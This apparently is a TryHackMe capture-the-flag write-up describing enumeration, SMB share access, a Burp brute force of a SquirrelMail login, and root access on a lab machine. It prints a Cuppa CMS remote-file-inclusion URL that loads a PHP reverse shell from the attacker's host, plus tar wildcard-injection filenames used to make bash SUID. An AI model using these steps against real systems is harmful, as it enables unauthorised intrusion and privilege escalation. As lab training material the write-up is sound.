ENUMERATION:

Nmap:

![image](https://user-images.githubusercontent.com/126739122/234119747-5bda27b1-745c-44c4-975c-b4216a6d9143.png)

Browsed to http://10.10.183.158 and found this webpage:

![image](https://user-images.githubusercontent.com/126739122/234119768-2e15016f-1b71-4fb6-b364-37bac7320e5c.png)

Seems to be a standard search engine page with no outstanding vulnerabilities or information in source code for exploitation or foothold.

Ran gobuster to enumerate any hidden directories for this web server and found the following:

![image](https://user-images.githubusercontent.com/126739122/234119798-4ba977e2-381f-4431-8d9e-0047f013dcca.png)

Attempted to browse to /admin directory > received 403 error code
Navigated to /squirrelmail directory and found the following login page:

![image](https://user-images.githubusercontent.com/126739122/234119820-bc13b261-8c63-4eba-8531-8db4ae9d9c3f.png)

Tried entering default admin credentials (admin:admin) but that did not work and redirected me back to login page
The TryHackMe questions for this room are used to guide the progress through the machine and hint that we should be looking for Miles' credentials for this login webpage.

At this point, I have not found any credentials for any users and need to do further enumeration/information gathering.
Looking back at the Nmap scan, it shows that port 445 is also open on this machine.

Ran smbclient to look for any public shares that may contain some credentials and received the following output:

![image](https://user-images.githubusercontent.com/126739122/234119862-f5d8e78a-e998-4491-ba05-40fae37d41b0.png)

"milesdyson" share requires a username and password to connect and access those files
"anonymous" share does not require a password and found a couple of helpful files (attention.txt & log1.txt)

attention.txt states that all users passwords have been changed for SMB and everyone needs to reset it ASAP
log1.txt seems to be a wordlist of about 30 possible passwords that could be used for brute-forcing

Using BurpSuite, I captured a login request to the SquirrelMail login page and tried logging in using milesdyson:test
Sent this captured request to Intruder and attempted a brute-force attack on this login page for milesdyson using the log1.txt file

After a couple of minutes, BurpSuite finally found the credentials of milesdyson:cyborg007haloterminator

Upon logging into Miles' inbox, there is an email regarding his SMB password change/reset
Using the provided password in Miles' email, we can now log into the "milesdyson" share

smbclient -U milesdyson '\\10.10.70.100\milesdyson'
	- Found 1 interesting file in Miles' share (important.txt)

important.txt contains the following:

![image](https://user-images.githubusercontent.com/126739122/234119878-ecc3aeba-9a40-4267-b0f1-b71bf497acf1.png)

#1 on this file seems to hint towards a hidden directory for this web server
Browsed to http://10.10.70.100/45kra24zxs28v3yd/ and found this webpage:

![image](https://user-images.githubusercontent.com/126739122/234119905-cb09b955-5af8-4d61-a2e3-cd091fd0b148.png)

There is nothing hidden in the source code for this webpage

Tried running gobuster one more time on this newfound webpage
	- found /administrator directory

INITIAL FOOTHOLD:

Browsed to http://10.10.70.100/45kra24zxs28v3yd/administrator/ and found this login page:

![image](https://user-images.githubusercontent.com/126739122/234119929-6d250e9e-c321-4f6b-8c05-d905c4a3f902.png)

Tried using the same SMB and SquirrelMail creds for Miles on this login page, but neither worked
Again, I do not have any other credentials or brute force attempts to try with this login page

Tried searching Cuppa CMS on google for any known vulnerabilities
Found https://www.exploit-db.com/exploits/25971
Shows that Cuppa CMS is vulnerable to remote file inclusion and can be used to gain reverse shell or remote code execution

Browsed to http://10.10.70.100/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://10.6.47.128:8000/php_rev_shell.php
I now have an active reverse shell for this machine as www-data

PRIVILEGE ESCALATION:

Transferred over LinPEAS from my local machine into this reverse shell
LinPEAS located a cronjob that is run as root every minute (/home/milesdyson/backups/backup.sh)

![image](https://user-images.githubusercontent.com/126739122/234119966-0eb803ad-b6de-4f78-b9cf-38e69013a4bc.png)

This second command that is run on the cronjob "tar cf /home/milesdyson/backups/backup.tgz * " the * wildcard can be used for privilege escalation up to root

REF: https://www.hackingarticles.in/exploiting-wildcard-for-privilege-escalation/
Created a shell.sh script in /var/www/html that will change the /bin/bash binary to SUID
Also created "--checkpoint-action=exec=sh shell.sh" and "--checkpoint=1" files

After about 1 minute, /bin/bash is now a SUID binary
Ran /bin/bash -p
Now I have root privileges

FOUND BOTH USER AND ROOT FLAG
